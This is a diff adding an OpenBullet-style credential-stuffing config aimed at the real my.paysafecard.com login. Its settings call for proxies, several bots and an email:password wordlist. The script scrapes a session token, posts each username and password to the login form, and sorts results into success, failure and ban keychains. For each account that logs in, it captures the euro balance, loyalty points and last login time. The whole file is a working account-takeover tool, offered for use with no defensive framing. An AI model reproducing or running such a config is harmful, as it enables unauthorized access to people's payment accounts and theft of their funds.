@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "MyPaysafecard ( Capture )",
+  "SuggestedBots": 5,
+  "LastModified": "2018-07-02T01:48:09.3989663+00:00",
+  "AdditionalInfo": "",
+  "Author": "Marine",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_TOKEN REQUEST GET "https://my.paysafecard.com/mypins-psc//login.xhtml" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://my.paysafecard.com/mypins-psc/" 
+  HEADER "origin: https://my.paysafecard.com" 
+#CAPTURE_TOKEN PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"javax.faces.ViewState\" id=\"javax.faces.ViewState\" value=\"" "\" autocomplete=\"off\" />" Recursive=FALSE -> VAR "Token" "" "" 
+#LOGIN REQUEST POST "https://my.paysafecard.com/mypins-psc//login.xhtml" AutoRedirect=TRUE 
+  CONTENT "loginForm=loginForm&loginForm%3Ausername=<USER>&loginForm%3Apassword=<PASS>&loginForm%3AtimeZoneOffset=7200000&loginForm%3Alogin=Connexion&javax.faces.ViewState=<Token>&javax.faces.RenderKitId=HTML5_BASIC" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://my.paysafecard.com/mypins-psc/" 
+  HEADER "origin: https://my.paysafecard.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Veuillez vérifier les champs marqués en rouge" 
+    KEY "Votre connexion a échoué" 
+  KEYCHAIN Success OR 
+    KEY " <div>Numéro de client :" 
+  KEYCHAIN Ban OR 
+    KEY "We are sorry, but due to policy restrictions my paysafecard is currently not available and your request could not be processed. Please try again later." 
+#CAPTURE_CREDIT PARSE "<SOURCE>" LR "<i class=\"icon icon_balance\"></i>" "EUR" Recursive=FALSE -> CAP "Crédit" "" "€" 
+#CAPTURE_PLUS_POINT PARSE "<SOURCE>" LR "<div class=\"point-label\"><span id=\"cashPointAmount\">" "</span>" Recursive=FALSE -> CAP "PlusPoint" "" "" 
+#CAPTURE_LAST_CONNETION PARSE "<SOURCE>" LR "<span id=\"lastLoginTimestamp\">" "<span class=\"hidden-tablet hidden-xs hidden-sm\"> " Recursive=FALSE -> CAP "Last Connection" "" "" 
